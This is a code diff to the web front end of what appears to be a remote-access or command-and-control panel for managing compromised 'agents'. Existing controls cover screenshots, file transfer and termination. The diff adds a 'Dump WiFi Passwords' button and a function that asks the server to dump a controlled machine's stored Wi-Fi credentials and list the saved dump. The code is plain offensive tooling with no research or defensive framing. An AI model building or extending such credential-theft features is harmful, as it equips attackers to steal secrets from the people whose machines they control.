@@ -273,17 +273,20 @@ function createAgentTab(agentId, agentInfo) {
                     </span>
                 </div>
                 <div class="agent-actions">
-                    <button onclick="takeScreenshot(${agentId})" title="Take Screenshot">
+                    <button title="Take Screenshot" onclick="takeScreenshot(${agentId})">
                         <span class="material-icons">photo_camera</span>
                     </button>
-                    <button onclick="uploadFile(${agentId})" title="Upload File">
-                        <span class="material-icons">upload</span>
+                    <button title="Upload File" onclick="uploadFile(${agentId})">
+                        <span class="material-icons">upload_file</span>
                     </button>
-                    <button onclick="downloadFile(${agentId})" title="Download File">
+                    <button title="Download File" onclick="downloadFile(${agentId})">
                         <span class="material-icons">download</span>
                     </button>
-                    <button onclick="terminateAgent(${agentId})" title="Terminate">
-                        <span class="material-icons">power_settings_new</span>
+                    <button title="Dump WiFi Passwords" onclick="dumpWifiPasswords(${agentId})">
+                        <span class="material-icons">wifi</span>
+                    </button>
+                    <button title="Terminate" onclick="terminateAgent(${agentId})">
+                        <span class="material-icons">close</span>
                     </button>
                 </div>
             </div>
@@ -1602,4 +1605,35 @@ document.getElementById('dumps-search')?.addEventListener('input', (e) => {
         const name = item.querySelector('.dump-item-name').textContent.toLowerCase();
         item.style.display = name.includes(searchTerm) ? 'block' : 'none';
     });
-}); 
+});
+
+function dumpWifiPasswords(agentId) {
+    showProgressBar(agentId, true, 'wifi');
+    updateProgressBar(agentId, 50, 'Dumping WiFi passwords...');
+    
+    fetch('/api/wifi_dump', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            session_id: agentId
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.error) {
+            throw new Error(data.error);
+        }
+        
+        showProgressBar(agentId, false);
+        appendToTerminal(`WiFi passwords dumped successfully\nSaved to: ${data.path}`, 'success', agentId);
+        
+        // Refresh dumps list
+        refreshDumps();
+    })
+    .catch(error => {
+        showProgressBar(agentId, false);
+        appendToTerminal(`Error dumping WiFi passwords: ${error.message}`, 'error', agentId);
+    });
+} 
